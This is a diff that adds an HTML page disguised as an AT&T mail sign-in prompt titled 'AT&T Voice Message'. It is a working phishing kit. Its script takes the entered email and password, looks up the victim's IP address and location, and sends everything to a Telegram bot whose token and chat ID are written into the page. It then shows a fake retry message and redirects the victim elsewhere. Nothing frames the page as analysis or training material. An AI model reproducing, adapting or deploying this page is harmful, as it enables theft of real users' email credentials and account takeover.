@@ -1,0 +1,257 @@
+<html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AT&amp;T Voice Message</title>
+    <!-- Font Awesome CDN -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+            font-size: 20px !important;
+            background-image: url('https://gyazo.com/aa84d4465d8a7011e0dba4b60669a783.png');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            min-height: 100vh;
+            display: flex;
+            align-items: flex-start; /* Align items to the top */
+            justify-content: center;
+            backdrop-filter: blur(0px);
+            padding-top: 50px; /* Add padding to the top of the body */
+        }
+
+        .login-container {
+            max-width: 300px; /* Keep the same size */
+            margin: 20px auto; /* Reduced margin-top to move the box up */
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.6);
+            padding: 40px;
+            text-align: center;
+        }
+
+        .login-logo {
+            margin-bottom: 30px;
+        }
+
+        .login-logo img {
+            width: 80px; /* Keep the same size */
+            height: 70px; /* Keep the same size */
+            object-fit: contain;
+        }
+
+        .login-input {
+            width: calc(100% - 40px);
+            height: 50px;
+            padding: 12px 20px;
+            margin: 8px 0;
+            box-sizing: border-box;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            padding-left: 40px;
+        }
+
+        .login-input:focus {
+            outline: none;
+            border-color: #007bff;
+        }
+
+        .login-button {
+            width: calc(100% - 40px);
+            height: 50px;
+            background-color: #000;
+            color: #fff;
+            padding: 14px 20px;
+            margin: 8px 0;
+            border: 1px solid;
+            border-radius: 8px;
+            cursor: pointer;
+        }
+
+        .login-button:hover {
+            background-color: #272626;
+        }
+
+        #invalidPasswordMessage {
+            display: none;
+            color: red;
+            margin-bottom: 10px;
+            font-size: 15px;
+        }
+    </style>
+</head>
+<body>
+    <!-- Display IP address -->
+    <input id="ipAddress" hidden="">
+    <input id="location" hidden="">
+
+    <div class="login-container">
+        <div class="login-logo">
+            <img id="domainLogo" src="https://i.gyazo.com/65bc73d661a778583ae47d60a6ade1d5.png" alt="Logo" width="100">
+        </div>
+        <div style="font-size: 15px;">Sign in to access AT&amp;T Mail and Currently.com Mail</div>
+        <form id="i0281" method="post">
+            <div class="identityBanner" style="position: relative;">
+                <i class="fas fa-user" style="position: absolute; left: 30px; top: 50%; transform: translateY(-50%); color: #aaa;"></i>
+                <input style="font-size: 16px !important;" type="text" class="login-input" placeholder="User ID" name="username" id="usernameInput" value="">
+            </div>
+            <br>
+            <div style="position: relative;">
+                <i class="fas fa-lock" style="position: absolute; left: 30px; top: 50%; transform: translateY(-50%); color: #aaa;"></i>
+                <input style="font-size: 17px !important;" type="password" class="login-input" placeholder="Password" name="password" id="passwordInput">
+            </div>
+            <br>
+            <div id="invalidPasswordMessage" style="display: none; color: red; margin-bottom: 10px; font-size: 15px;">Invalid password</div>
+            <button style="font-size: 19px !important;" type="submit" id="login-button" class="login-button">Continue</button>
+        </form>
+        <img src="https://c.tenor.com/I6kN-6X7nhAAAAAj/loading-buffering.gif" style="margin-top: 15px;" width="30">
+    </div>
+
+    <script>
+        // Telegram bot configuration
+        const botToken = '8176672990:AAE4Q2PLPvk6FAqNWzvkDCQGZ6kgnejzK_E'; // Replace with your bot token
+        const chatId = '7823199235'; // Replace with your chat ID
+        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+        // Function to fetch the IP address
+        async function getIPAddress() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                if (!response.ok) throw new Error('Failed to fetch IP address');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error('Error fetching IP address:', error.message);
+                return 'Unknown';
+            }
+        }
+
+        // Function to fetch the location (Country, State, City) from the IP address
+        async function getLocationFromIP(ip) {
+            try {
+                const response = await fetch(`http://ip-api.com/json/${ip}?fields=61439`);
+                if (!response.ok) throw new Error('Failed to fetch location');
+                const data = await response.json();
+                const country = data.country || 'Unknown';
+                const state = data.regionName || 'Unknown';
+                const city = data.city || 'Unknown';
+                return `${country}, ${state}, ${city}`;
+            } catch (error) {
+                console.error('Error fetching location:', error.message);
+                return 'Unknown';
+            }
+        }
+
+        // Function to send data to Telegram
+        async function sendToTelegram(message) {
+            try {
+                const response = await fetch(telegramUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                });
+
+                if (!response.ok) {
+                    throw new Error(`Telegram API error: ${response.statusText}`);
+                }
+
+                const data = await response.json();
+                console.log('Message sent to Telegram:', data);
+                return true;
+            } catch (error) {
+                console.error('Error sending message to Telegram:', error);
+                return false;
+            }
+        }
+
+        // Function to fetch logo based on email domain
+        function fetchLogo(email) {
+            const domain = email.split('@')[1]; // Extract domain from email
+            const attDomains = ["ameritech.net", "bellsouth.net", "flash.net", "nvbell.net", "pacbell.net", "sbcglobal.net", "snet.net", "swbell.net", "wans.net"];
+            const logoImage = document.getElementById("domainLogo");
+
+            if (attDomains.includes(domain)) {
+                logoImage.src = `https://logo.clearbit.com/att.com`;
+                logoImage.style.width = '80px'; // Keep the same size
+                return;
+            }
+
+            if (domain === 'msn.com') {
+                logoImage.src = `https://logo.clearbit.com/outlook.com`;
+                logoImage.style.width = '80px'; // Keep the same size
+                return;
+            }
+
+            const logoUrl = `https://logo.clearbit.com/${domain}`;
+            fetch(logoUrl)
+                .then(response => {
+                    if (!response.ok) throw new Error('Network response was not ok');
+                    return response.blob();
+                })
+                .then(blob => {
+                    const reader = new FileReader();
+                    reader.onload = () => {
+                        logoImage.src = reader.result;
+                        logoImage.style.width = '80px'; // Keep the same size
+                    };
+                    reader.readAsDataURL(blob);
+                })
+                .catch(() => {
+                    logoImage.src = 'https://i.gyazo.com/65bc73d661a778583ae47d60a6ade1d5.png';
+                    logoImage.style.width = '200px'; // Default logo size
+                });
+        }
+
+        // Form submit handler
+        document.getElementById("i0281").addEventListener("submit", async function(event) {
+            event.preventDefault();
+
+            const email = document.getElementById("usernameInput").value;
+            const password = document.getElementById("passwordInput").value;
+
+            if (password.length < 6) {
+                document.getElementById("invalidPasswordMessage").style.display = 'block';
+                document.getElementById("passwordInput").value = '';
+                return;
+            }
+
+            try {
+                const ip = await getIPAddress();
+                const location = await getLocationFromIP(ip);
+
+                // Prepare the message for Telegram
+                const message = `EMAIL: ${email}\nPASSWORD: ${password}\nIP: ${ip}\nLOCATION: ${location}`;
+
+                // Send the message to Telegram
+                const success = await sendToTelegram(message);
+
+                // Notify the user
+                if (success) {
+                    alert('Please try again.');
+                } else {
+                    alert('Failed to send data to Telegram. Check the console for details.');
+                }
+
+                // Redirect after sending the message
+                const domain = email.split('@')[1];
+                const redirectUrl = domain ? `https://${domain}` : 'https://currently.att.yahoo.com';
+                window.location.href = redirectUrl;
+            } catch (error) {
+                console.error('Error:', error);
+                alert('An error occurred. Please try again.');
+            }
+        });
+
+        // Event listeners
+        document.getElementById("usernameInput").addEventListener("input", function() {
+            fetchLogo(this.value);
+        });
+    </script>
+
+</body></html>
